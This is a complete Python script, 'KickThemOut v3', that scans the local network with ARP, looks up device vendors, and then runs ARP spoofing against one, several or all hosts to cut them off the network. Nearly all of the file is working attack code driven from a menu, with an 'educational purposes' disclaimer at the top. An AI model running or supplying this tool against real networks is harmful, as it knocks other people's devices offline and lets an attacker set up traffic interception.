#!/usr/bin/env python3
# -.- coding: utf-8 -.-
# kickthemout_v3.py

"""
KickThemOut v3

Disclaimer: This tool is for educational purposes and authorized network administration only.
Use responsibly on networks you own or have permission to test.
"""

import sys
import os
import time
import threading
import signal
import logging
import argparse
from typing import List, Dict, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor

# Suppress Scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    from scapy.all import ARP, Ether, srp, sendp, conf, get_if_hwaddr, get_if_addr
    import requests
    from rich.console import Console
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
    from rich.prompt import Prompt, IntPrompt, Confirm
    from rich.panel import Panel
    from rich import print as rprint
except ImportError as e:
    print(f"Missing dependency: {e}")
    print("Please install requirements: pip install -r requirements.txt")
    sys.exit(1)


# Configuration
VERSION = "3.0.0"
MAC_API_URL = "https://api.maclookup.app/v2/macs/{mac}"
DEFAULT_PACKET_RATE = 10  # Packets per second (approx)


class NetworkScanner:
    def __init__(self, interface: str = None):
        if interface:
            self.interface = interface
        else:
            try:
                # Auto-detect interface used to reach the internet (8.8.8.8)
                # conf.route.route returns (iface, output_ip, gateway_ip)
                self.interface = conf.route.route("8.8.8.8")[0]
            except Exception:
                self.interface = conf.iface

        self.my_ip = get_if_addr(self.interface)
        self.my_mac = get_if_hwaddr(self.interface)
        self.gateway_ip = self._get_gateway_ip()
        self.gateway_mac = None

    def _get_gateway_ip(self) -> str:
        """Retrieves the default gateway IP."""
        try:
            # Use route to 8.8.8.8 (Google DNS) to find the internet gateway
            return conf.route.route("8.8.8.8")[2]
        except Exception:
            # Fallback to default route if 8.8.8.8 fails
            return conf.route.route("0.0.0.0")[2]

    def scan(self, ip_range: str = None) -> List[Dict[str, str]]:
        """Scans the network for online hosts using ARP."""
        if not ip_range:
            # Assume /24 subnet of the interface IP if not provided
            ip_parts = self.my_ip.split('.')
            ip_range = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/24"

        hosts = []
        
        # ARP Request
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range), 
                     timeout=2, 
                     iface=self.interface, 
                     verbose=False)

        for sent, received in ans:
            # Don't include ourselves
            if received.psrc == self.my_ip:
                continue
                
            hosts.append({
                "ip": received.psrc,
                "mac": received.hwsrc,
                "vendor": "Unknown" # Will resolve later
            })

            # Identify gateway MAC
            if received.psrc == self.gateway_ip:
                self.gateway_mac = received.hwsrc

        return hosts

    def resolve_vendors(self, hosts: List[Dict[str, str]]):
        """Resolves MAC vendors in parallel."""
        with ThreadPoolExecutor(max_workers=10) as executor:
            # Determine vendor for each host
            for host in hosts:
                executor.submit(self._resolve_single_vendor, host)

    def _resolve_single_vendor(self, host: Dict[str, str]):
        try:
            mac = host['mac'].replace(":", "-")
            response = requests.get(MAC_API_URL.format(mac=mac), timeout=2)
            if response.status_code == 200:
                data = response.json()
                if data.get("found"):
                    host['vendor'] = data.get("company", "Unknown")
        except Exception:
            pass  # Keep as Unknown on error


class ArpSpoofer:
    def __init__(self, interface: str, gateway_ip: str, gateway_mac: str, targets: List[Dict[str, str]]):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.targets = targets
        self.running = False
        self.thread = None
        self.my_mac = get_if_hwaddr(self.interface)

    def start(self, packets_per_min: int = 60):
        self.running = True
        self.interval = 60.0 / float(packets_per_min)
        self.thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self.thread.start()

    def stop(self):
        self.running = False
        if self.thread and self.thread.is_alive():
            self.thread.join(timeout=2.0)
        self.restore()

    def _spoof_loop(self):
        """Main spoofing loop."""
        while self.running:
            for target in self.targets:
                self._send_spoofed_packet(target['ip'], target['mac'])
            time.sleep(self.interval)

    def _send_spoofed_packet(self, target_ip: str, target_mac: str):
        # Tell the target that I am the gateway
        packet = Ether(src=self.my_mac, dst=target_mac) / \
                 ARP(op=2, psrc=self.gateway_ip, hwsrc=self.my_mac, pdst=target_ip, hwdst=target_mac)
        sendp(packet, iface=self.interface, verbose=False)

    def restore(self):
        """Restores the ARP tables of the targets."""
        rprint("[yellow]Restoring network connectivity...[/yellow]")
        for target in self.targets:
            # Tell target the real gateway MAC
            packet = Ether(src=self.gateway_mac, dst=target['mac']) / \
                     ARP(op=2, psrc=self.gateway_ip, hwsrc=self.gateway_mac, pdst=target['ip'], hwdst=target['mac'])
            # Send multiple times to ensure it's received
            sendp(packet, count=5, iface=self.interface, verbose=False)


class KickThemOutCLI:
    def __init__(self):
        self.console = Console()
        self.scanner = NetworkScanner()
        self.hosts = []
        self.spoofer = None

    def check_root(self):
        if os.geteuid() != 0:
            self.console.print(Panel("ERROR: This tool requires root privileges.\nPlease run with: [bold]sudo python3 kickthemout_v3.py[/bold]", style="red"))
            sys.exit(1)

    def scan_network(self):
        with self.console.status("[bold green]Scanning network...[/bold green]", spinner="dots"):
            self.hosts = self.scanner.scan()
            if not self.scanner.gateway_mac:
                self.console.print("[yellow]Warning: Could not automatically detect gateway MAC. Ensure gateway is online.[/yellow]")
            
            # Resolve vendors
            self.scanner.resolve_vendors(self.hosts)

    def display_hosts(self):
        table = Table(title=f"Detected Hosts (Gateway: {self.scanner.gateway_ip})")
        table.add_column("ID", style="cyan", no_wrap=True)
        table.add_column("IP Address", style="magenta")
        table.add_column("MAC Address", style="green")
        table.add_column("Vendor", style="yellow")

        for idx, host in enumerate(self.hosts):
            is_gateway = " (Gateway)" if host['ip'] == self.scanner.gateway_ip else ""
            table.add_row(str(idx), host['ip'] + is_gateway, host['mac'], host['vendor'])

        self.console.print(table)

    def get_targets(self, choice: str) -> List[Dict[str, str]]:
        targets = []
        if choice == '1': # Kick ONE
            try:
                # Ask for ID without listing all choices to keep UI clean
                idx = IntPrompt.ask("Enter the ID of the target")
                if 0 <= idx < len(self.hosts):
                    targets.append(self.hosts[idx])
                else:
                    self.console.print("[red]Invalid ID selected.[/red]")
            except ValueError:
                pass
        elif choice == '2': # Kick SOME
            input_str = Prompt.ask("Enter comma-separated IDs (e.g., 0,2,5)")
            try:
                indices = [int(x.strip()) for x in input_str.split(',')]
                for idx in indices:
                    if 0 <= idx < len(self.hosts):
                        targets.append(self.hosts[idx])
            except ValueError:
                self.console.print("[red]Invalid input format.[/red]")
        elif choice == '3': # Kick ALL
             # Exclude gateway from attack list to prevent total network crash (if it was in the list)
             targets = [h for h in self.hosts if h['ip'] != self.scanner.gateway_ip]

        return targets

    def run(self):
        self.check_root()
        
        # Header
        self.console.print(Panel.fit(f"[bold blue]KickThemOut v{VERSION}[/bold blue]", border_style="blue"))
        
        # Initial Scan
        self.scan_network()
        self.display_hosts()

        if not self.hosts:
            self.console.print("[red]No hosts found (or only user device found). Exiting.[/red]")
            return

        while True:
            self.console.print("\n[bold]Options:[/bold]")
            self.console.print("1. Kick [bold]ONE[/bold] Device")
            self.console.print("2. Kick [bold]SOME[/bold] Devices")
            self.console.print("3. Kick [bold]ALL[/bold] Devices")
            self.console.print("E. Exit")
            
            choice = Prompt.ask("Choose an option", choices=["1", "2", "3", "E", "e"], default="E")
            
            if choice.upper() == 'E':
                break

            targets = self.get_targets(choice)
            if not targets:
                self.console.print("[yellow]No valid targets selected. Aborting.[/yellow]")
                continue

            if not self.scanner.gateway_mac:
                 self.console.print("[red]Cannot start attack: Gateway MAC not found.[/red]")
                 # Fallback: Ask user? For now just abort for safety.
                 continue

            # Confirm
            self.console.print(f"[bold red]Targeting {len(targets)} device(s)...[/bold red]")
            if not Confirm.ask("Start attack?"):
                continue

            # Start Attack
            self.spoofer = ArpSpoofer(self.scanner.interface, self.scanner.gateway_ip, self.scanner.gateway_mac, targets)
            
            packets = IntPrompt.ask("Packets per minute", default=600) # Default 10/sec for effectiveness

            self.console.print(f"[bold green]Attack Running... Press Ctrl+C to stop.[/bold green]")
            
            try:
                self.spoofer.start(packets_per_min=packets)
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.console.print("\n[yellow]Stopping attack...[/yellow]")
                self.spoofer.stop()
                break

        self.console.print("[bold blue]Goodbye![/bold blue]")

def main():
    cli = KickThemOutCLI()
    cli.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit(0)
